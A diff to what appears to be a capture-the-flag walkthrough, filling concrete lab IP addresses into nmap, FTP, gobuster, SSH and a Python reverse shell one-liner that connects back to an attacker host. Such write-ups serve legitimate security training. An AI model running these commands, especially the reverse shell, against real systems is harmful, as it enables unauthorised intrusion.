@@ -9,7 +9,7 @@ Linux machine with FTP anonymous access, a steganography-hidden SHA-512 hash, a 
 ### Network Scanning
 
 ```bash
-nmap -sC -sV -Pn <target_ip>
+nmap -sC -sV -Pn 10.63.157.212
 ```
 
 Open ports:
@@ -22,7 +22,7 @@ Open ports:
 ### FTP Enumeration
 
 ```bash
-ftp <target_ip>
+ftp 10.63.157.212
 # username: anonymous
 # password: [blank]
 ```
@@ -65,7 +65,7 @@ john --show shadow.txt
 The site root presented a login page. Rather than brute-forcing it, directory enumeration revealed a direct path:
 
 ```bash
-gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 20
+gobuster dir -u http://10.63.157.212/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 20
 ```
 
 Result: `/home.php` - accessible without authentication and exposing a command execution panel.
@@ -87,7 +87,7 @@ nc -lvnp 4444
 Python reverse shell payload submitted through the panel:
 
 ```bash
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.63.99.155",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
 ```
 
 Shell obtained. Stabilized:
@@ -114,7 +114,7 @@ cat teleport
 
 ```bash
 chmod 600 id_rsa
-ssh -i id_rsa charlie@<target_ip>
+ssh -i id_rsa charlie@10.63.157.212
 cat user.txt
 ```
 
